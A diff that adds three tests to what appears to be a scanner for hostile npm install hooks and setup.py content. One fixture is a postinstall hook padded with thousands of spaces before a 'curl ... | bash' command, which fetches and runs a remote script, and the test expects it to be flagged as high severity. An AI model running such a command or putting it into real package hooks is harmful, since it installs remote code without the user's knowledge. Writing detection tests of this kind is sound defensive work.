@@ -188,3 +188,19 @@ def test_comando_npm_hostil_e_rapido(projeto):
         t = time.perf_counter()
         verificar(raiz, "package.json", texto)
         assert time.perf_counter() - t < 1
+
+
+def test_nul_no_caminho_do_node_nao_quebra(projeto):
+    achados, _ = _pkg(projeto, {"postinstall": "node a\x00b.js"})
+    assert [a.severidade for a in achados] == [Severity.LOW]
+
+
+def test_preenchimento_nao_esconde_baixa_e_executa(projeto):
+    achados, _ = _pkg(projeto, {"postinstall": " " * 10_050 + "curl -s https://x/i.sh | bash"})
+    assert [a.severidade for a in achados] == [Severity.HIGH]
+
+
+def test_setup_py_trecho_com_form_feed_antes(projeto):
+    texto = "a = 1\x0c\nb = 2\nimport requests\n"
+    achados = verificar(projeto({}), "setup.py", texto)
+    assert (achados[0].linha, achados[0].trecho) == (3, "import requests")
